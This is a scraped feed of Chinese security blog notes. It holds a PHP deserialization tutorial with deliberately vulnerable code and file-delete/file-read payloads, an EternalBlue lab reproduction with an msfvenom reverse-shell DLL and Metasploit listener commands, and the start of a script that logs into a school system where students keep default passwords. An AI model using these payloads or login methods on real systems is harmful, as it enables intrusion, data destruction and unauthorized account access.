class="line">$usr-&gt;age = 20;    </span><br><span class="line">$usr-&gt;name = &apos;John&apos;;    </span><br><span class="line">     </span><br><span class="line">// 输出数据    </span><br><span class="line">     </span><br><span class="line">$usr-&gt;PrintData();    </span><br><span class="line">     </span><br><span class="line">// 输出序列化之后的数据    </span><br><span class="line">     </span><br><span class="line">echo serialize($usr);    </span><br><span class="line">     </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226151805778" alt=""></p>
<p>为了使用这个对象，在4.php中用unserialize重建对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">     </span><br><span class="line">// 某类    </span><br><span class="line">     </span><br><span class="line">class User    </span><br><span class="line">&#123;    </span><br><span class="line">    // Class data    </span><br><span class="line">     </span><br><span class="line">    public $age = 0;    </span><br><span class="line">    public $name = &apos;&apos;;    </span><br><span class="line">     </span><br><span class="line">    // Print data    </span><br><span class="line">     </span><br><span class="line">    public function PrintData()    </span><br><span class="line">    &#123;    </span><br><span class="line">        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old. &lt;br /&gt;&apos;;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line">     </span><br><span class="line">// 重建对象    </span><br><span class="line">     </span><br><span class="line">$usr = unserialize(&apos;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;&#125;&apos;);    </span><br><span class="line">     </span><br><span class="line">// 调用PrintData 输出数据    </span><br><span class="line">     </span><br><span class="line">$usr-&gt;PrintData();    </span><br><span class="line">     </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226152046329" alt=""></p>
<p>magic函数<strong>construct和</strong>destruct会在对象创建或者销毁时自动调用；<strong>sleep magic方法在一个对象被序列化的时候调用；</strong>wakeup magic方法在一个对象被反序列化的时候调用。在5.php中添加这几个magic函数的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">   </span><br><span class="line">class Test  </span><br><span class="line">&#123;  </span><br><span class="line">    public $variable = &apos;BUZZ&apos;;  </span><br><span class="line">    public $variable2 = &apos;OTHER&apos;;  </span><br><span class="line">   </span><br><span class="line">    public function PrintVariable()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    public function __construct()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;__construct&lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    public function __destruct()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;__destruct&lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    public function __wakeup()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;__wakeup&lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    public function __sleep()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;__sleep&lt;br /&gt;&apos;;  </span><br><span class="line">   </span><br><span class="line">        return array(&apos;variable&apos;, &apos;variable2&apos;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">// 创建对象调用__construct</span><br><span class="line">   </span><br><span class="line">$obj = new Test();  </span><br><span class="line">   </span><br><span class="line">// 序列化对象调用__sleep  </span><br><span class="line">   </span><br><span class="line">$serialized = serialize($obj);  </span><br><span class="line">   </span><br><span class="line">// 输出序列化后的字符串  </span><br><span class="line">   </span><br><span class="line">print &apos;Serialized: &apos; . $serialized . &apos;&lt;br /&gt;&apos;;  </span><br><span class="line">   </span><br><span class="line">// 重建对象调用__wakeup  </span><br><span class="line">   </span><br><span class="line">$obj2 = unserialize($serialized);  </span><br><span class="line">   </span><br><span class="line">// 调用PintVariable输出数据 </span><br><span class="line">   </span><br><span class="line">$obj2-&gt;PrintVariable();  </span><br><span class="line">   </span><br><span class="line">// 脚本结束调用__destruct   </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226163434517" alt=""></p>
<p>现在我们了解序列化是如何工作的，但是我们如何利用它呢?有多种可能的方法，取决于应用程序、可用的类和magic函数。记住，序列化对象包含攻击者控制的对象值。你可能在Web应用程序源代码中找到一个定义<strong>wakeup或</strong>destruct的类，这些函数会影响Web应用程序。例如，我们可能会找到一个临时将日志存储到文件中的类。当销毁时对象可能不再需要日志文件并将其删除。把下面这段代码保存为logfile.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">   </span><br><span class="line">class LogFile  </span><br><span class="line">&#123;  </span><br><span class="line">    // log文件名  </span><br><span class="line">   </span><br><span class="line">    public $filename = &apos;error.log&apos;;  </span><br><span class="line">   </span><br><span class="line">    // 储存日志文件  </span><br><span class="line">   </span><br><span class="line">    public function LogData($text)  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;Log some data: &apos; . $text . &apos;&lt;br /&gt;&apos;;  </span><br><span class="line">        file_put_contents($this-&gt;filename, $text, FILE_APPEND);  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    // 删除日志文件  </span><br><span class="line">   </span><br><span class="line">    public function __destruct()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;__destruct deletes &quot;&apos; . $this-&gt;filename . &apos;&quot; file. &lt;br /&gt;&apos;;  </span><br><span class="line">        unlink(dirname(__FILE__) . &apos;/&apos; . $this-&gt;filename);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这是一个使用它的例子。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">     </span><br><span class="line">include &apos;logfile.php&apos;;    </span><br><span class="line">     </span><br><span class="line">// 创建一个对象    </span><br><span class="line">     </span><br><span class="line">$obj = new LogFile();    </span><br><span class="line">     </span><br><span class="line">// 设置文件名和要储存的日志数据    </span><br><span class="line">     </span><br><span class="line">$obj-&gt;filename = &apos;somefile.log&apos;;    </span><br><span class="line">$obj-&gt;LogData(&apos;Test&apos;);    </span><br><span class="line">     </span><br><span class="line">// 脚本结束__destruct被调用somefile.log文件被删除  </span><br><span class="line">     </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>在其它脚本中我们可能找到一个unserialize的调用，并且参数是用户提供的。把下面这段代码保存为test.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">   </span><br><span class="line">include &apos;logfile.php&apos;;  </span><br><span class="line">   </span><br><span class="line">// ... 一些使用LogFile类的代码...  </span><br><span class="line">   </span><br><span class="line">// 简单的类定义  </span><br><span class="line">   </span><br><span class="line">class User  </span><br><span class="line">&#123;  </span><br><span class="line">    // 类数据  </span><br><span class="line">   </span><br><span class="line">    public $age = 0;  </span><br><span class="line">    public $name = &apos;&apos;;  </span><br><span class="line">   </span><br><span class="line">    // 输出数据  </span><br><span class="line">   </span><br><span class="line">    public function PrintData()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old. &lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">// 重建用户输入的数据  </span><br><span class="line">   </span><br><span class="line">$usr = unserialize($_GET[&apos;usr_serialized&apos;]);  </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>创建利用代码111.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">include &apos;logfile.php&apos;;  </span><br><span class="line"></span><br><span class="line">$obj = new LogFile();  </span><br><span class="line">$obj-&gt;filename = &apos;1.php&apos;;  </span><br><span class="line">   </span><br><span class="line">echo serialize($obj) . &apos;&lt;br /&gt;&apos;;  </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226171240425" alt=""></p>
<p>访问<a href="http://192.168.153.138/test.php?usr_serialized=O:7:&quot;LogFile&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.php&quot;;}" target="_blank" rel="noopener">http://192.168.153.138/test.php?usr_serialized=O:7:&quot;LogFile&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.php&quot;;}</a></p>
<p><img src="http://img.blog.csdn.net/20161226171734880" alt=""></p>
<p>显示已经删除了1.php。验证一下，果然成功删除了。<br><img src="http://img.blog.csdn.net/20161226171852146" alt=""></p>
<p>这就是漏洞名称的由来：在变量可控并且进行了unserialize操作的地方注入序列化对象，实现代码执行或者其它坑爹的行为。先不谈 <strong>wakeup 和 </strong>destruct，还有一些很常见的注入点允许你利用这个类型的漏洞，一切都是取决于程序逻辑。举个例子，某用户类定义了一个<strong>toString为了让应用程序能够将类作为一个字符串输出(echo $obj)，而且其他类也可能定义了一个类允许</strong>toString读取某个文件。把下面这段代码保存为test.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">   </span><br><span class="line">// … 一些include ...  </span><br><span class="line">   </span><br><span class="line">class FileClass  </span><br><span class="line">&#123;  </span><br><span class="line">    // 文件名  </span><br><span class="line">   </span><br><span class="line">    public $filename = &apos;error.log&apos;;  </span><br><span class="line">   </span><br><span class="line">    // 当对象被作为一个字符串会读取这个文件  </span><br><span class="line">   </span><br><span class="line">    public function __toString()  </span><br><span class="line">    &#123;  </span><br><span class="line">        return file_get_contents($this-&gt;filename);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">// Main User class  </span><br><span class="line">   </span><br><span class="line">class User  </span><br><span class="line">&#123;  </span><br><span class="line">    // Class data  </span><br><span class="line">   </span><br><span class="line">    public $age = 0;  </span><br><span class="line">    public $name = &apos;&apos;;  </span><br><span class="line">   </span><br><span class="line">    // 允许对象作为一个字符串输出上面的data  </span><br><span class="line">   </span><br><span class="line">    public function __toString()  </span><br><span class="line">    &#123;  </span><br><span class="line">        return &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old. &lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">// 用户可控  </span><br><span class="line">   </span><br><span class="line">$obj = unserialize($_GET[&apos;usr_serialized&apos;]);  </span><br><span class="line">   </span><br><span class="line">// 输出__toString  </span><br><span class="line">   </span><br><span class="line">echo $obj;  </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>访问<a href="http://192.168.153.138/test.php?usr_serialized=O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;}" target="_blank" rel="noopener">http://192.168.153.138/test.php?usr_serialized=O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;}</a></p>
<p><img src="http://img.blog.csdn.net/20161226172759524" alt=""></p>
<p>但是如果我们用序列化调用FileClass呢?先建立一个1.txt。</p>
<p><img src="http://img.blog.csdn.net/20161226181346046" alt=""></p>
<p>创建利用代码123.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"> </span><br><span class="line">include &apos;test.php&apos;;  </span><br><span class="line">$fileobj = new FileClass();  </span><br><span class="line">$fileobj-&gt;filename = &apos;1.txt&apos;;  </span><br><span class="line">   </span><br><span class="line">echo serialize($fileobj);  </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226174603949" alt=""></p>
<p>访问<a href="http://192.168.153.138/test.php?usr_serialized=O:9:&quot;FileClass&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;}" target="_blank" rel="noopener">http://192.168.153.138/test.php?usr_serialized=O:9:&quot;FileClass&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;}</a></p>
<p><img src="http://img.blog.csdn.net/20161226174705550" alt=""></p>
<p>成功显示了文本内容。也可以使用其他magic函数：如果对象将调用一个不存在的函数<strong>call将被调用；如果对象试图访问不存在的类变量</strong>get和__set将被调用。但是利用这种漏洞并不局限于magic函数，在普通的函数上也可以采取相同的思路。例如User类可能定义一个get方法来查找和打印一些用户数据，但是其他类可能定义一个从数据库获取数据的get方法，这从而会导致SQL注入漏洞。set或write方法会将数据写入任意文件，可以利用它获得远程代码执行。唯一的技术问题是注入点可用的类，但是一些框架或脚本具有自动加载的功能。最大的问题在于人：理解应用程序以能够利用这种类型的漏洞，因为它可能需要大量的时间来阅读和理解代码。</p>
<p>原文链接：<a href="http://blog.csdn.net/qq_32400847/article/details/53873275" target="_blank" rel="noopener">http://blog.csdn.net/qq_32400847/article/details/53873275</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[方程式 0day Eternalblue复现]]></title>
      <url>https://uknowsec.cn/posts/notes/%E6%96%B9%E7%A8%8B%E5%BC%8F-0day-Eternalblue%E5%A4%8D%E7%8E%B0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h1><span id="前言">前言</span></h1><p>昨天去学长公司了，在公司呆了一下午。其间学长的同事让我复现下方程式Eternalblue，但是由于我没有带电脑所以没有在那边进行复现。Eternalblue之前我是有复现过的，那时候是用吐司上别人发的MSF集成的脚本。但是好像是成功了，回来打开KALI还看到之前的成功记录。这次再次进行一次复现，在这个过程中，一开始我是按照学长同事给的freebuf上的一篇文章来的，但是我最初下载的Empire是最新版的，然后在配置listeners的过程中出现错误，不能配置。无奈在他人的提醒下下载了1.6版本但是由于之前安装了最新版的问题，1.6无法安装。所以只能直接用msf进行监听了。</p>
<h1><span id="正文">正文</span></h1><h2><span id="环境准备">环境准备</span></h2><h3><span id="攻击机">攻击机</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">攻击机 ： 10.15.17.215</span><br><span class="line">win7 32bit 旗舰版</span><br><span class="line">python-2.6.6.msi</span><br><span class="line">https://www.python.org/download/releases/2.6.6/</span><br><span class="line">pywin32-221.win32-py2.6.exe</span><br><span class="line">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170526102843.jpg" alt=""></p>
<h3><span id="监听机">监听机</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">监听机 ： 10.15.198.65</span><br><span class="line">KALI</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170526101141.jpg" alt=""></p>
<h3><span id="靶机">靶机</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机 ： 10.15.251.226</span><br><span class="line">win 64bit en 旗舰版</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170526100922.jpg" alt=""></p>
<h2><span id="复现过程">复现过程</span></h2><h3><span id="生成dll文件">生成DLL文件</span></h3><ul>
<li><p>在KALI下生成s.dll到apache目录下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.15.198.65 LPORT=5555 -f dll &gt; /var/www/html/s.dll</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动apache服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170526101041.jpg" alt=""></p>
<h3><span id="设置监听">设置监听</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/mulit/handler</span><br><span class="line">set LHOST 10.15.198.65</span><br><span class="line">set LPORT 5555</span><br><span class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170526101328.jpg" alt=""></p>
<h3><span id="配置攻击脚本">配置攻击脚本</span></h3><ul>
<li>运行fb.py 配置攻击脚本</li>
<li>访问KALI的web服务器下载s.dll文件复制到C盘目录</li>
<li>加载DLL</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170526101230.jpg" alt=""></p>
<h3><span id="操作监听机">操作监听机</span></h3><ul>
<li>Msf里成功收到一个shell</li>
<li>getuid</li>
<li>ipconfig</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170526101328.jpg" alt=""><br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170526101109.jpg" alt=""></p>
<h2><span id="之前的复现图">之前的复现图</span></h2><p>附上之前利用msf集成exp脚本测试图。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/_ZC1FX3$WP%5DCML2JTF8MMTT.png" alt=""><br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/~X%7D5U%7D5VQO@OPK%5BN$5~_Y%5DG.png" alt=""></p>
<h1><span id="结语">结语</span></h1><p>昨天回来后休息了一会，然后才开始复现的，等我把环境配置好的时候已经断网了。Empire最新版无法配置listeners的问题一直没有解决。早上下载1.6版本有出现了错误，需要删除最新版。但是Empire是利用.sh安装的，想要卸载干净不是那么简单的。再加上我的KALI没有快照不能还原，无奈只能直接利用MSF，不能按照freebuf上的文章进行复现。然后自己的电脑也比较渣，开三个虚拟机一卡一卡的，陆陆续续才完成这个复现过程。</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Python编程实践学习--模拟登录爬取信息]]></title>
      <url>https://uknowsec.cn/posts/notes/python%E7%BC%96%E7%A8%8B%E5%AE%9E%E8%B7%B5%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E7%88%AC%E5%8F%96%E4%BF%A1%E6%81%AF.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="前言">前言</span></h2><p>最近在安全牛看《简单学python安全》这套视频教材，然后自己也想写个小东西，恰巧学习的一个信息系统，同学们的账号密码都是默认的，而且没有验证码，相对简单。所以就开始了这个小脚本的编写历程。这个过程中遇到了不少问题，请教了学长，在学长的帮助和指导下完成。在此回顾总结下这次过程。</p>
<h2><span id="正文">正文</span></h2><h3><span id="抓包分析">抓包分析</span></h3><p>一开始自己抓包分析的时候，出现了一些问题。登录过程分析得不够严谨，以致于模拟登录的时候出现不能登录上去的问题，后来学长帮我分析了下。原来这个模拟登录过程需要两个POST请求过程，而在这个过程中之前我使用的是urllib这个库来模拟登录，在学长的提示下使用request这个相较于urllib先进的库</p>
<h4><span id="第一个post包">第一个POST包</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /renzheng.jsp HTTP/1.1</span><br><span class="line">Host: xxxx.xxxx.edu.cn</span><br><span class="line">Content-Length: 142</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://xxxx.xxxx.edu.cn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Referer: http://xxxx.xxxx.edu.cn</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: UM_distinctid=15b7be26085454-0504ed9f0e367d-3c365402-100200-15b7be26086832; JSESSIONID=213C06E58934DCED50E4E479858CB055</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">displayName=&amp;displayPasswd=&amp;select=2&amp;submit.x=36&amp;submit.y=14&amp;operType=911&amp;random_form=-1048366953725273893&amp;userName=xxxxx&amp;passwd=xxxxx</span><br></pre></td></tr></table></figure>
<ul>
<li>从第一个包可以看出PostData部分由9各部分组成其中：</li>
<li>displayName、displayPasswd默认是空的</li>
<li>select、submit.x、submit.y这三个参数中，select是用户类型，如果是教师用户select=1,如果是学生用户select=2。submit.x、submit.y分别代表鼠标点击的坐标</li>
<li>operType、random_form这两个个参数中，operType默认为911，random_form是一个随机数字串</li>
<li>userName、passwd这两个参数是账号密码，明文传输</li>
</ul>
<h4><span id="第二个post包">第二个POST包</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /servlet/adminservlet HTTP/1.1</span><br><span class="line">Host: xxxx.xxxx.edu.cn</span><br><span class="line">Content-Length: 65</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://xxxx.xxxx.edu.cn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Referer: http://xxxx.xxxx.edu.cn/renzheng.jsp</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: UM_distinctid=15b7be26085454-0504ed9f0e367d-3c365402-100200-15b7be26086832; JSESSIONID=213C06E58934DCED50E4E479858CB055</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">isValidate=false&amp;userName=xxxxx&amp;passwd=xxxxx&amp;operType=911</span><br></pre></td></tr></table></figure>
<ul>
<li>看Referer可以看出这个包是由第一个包的页面跳转过来的</li>
<li>userName、passwd这两个参数是账号密码，明文传输</li>
<li>isValidate默认为false</li>
<li>operType默认为911</li>
</ul>
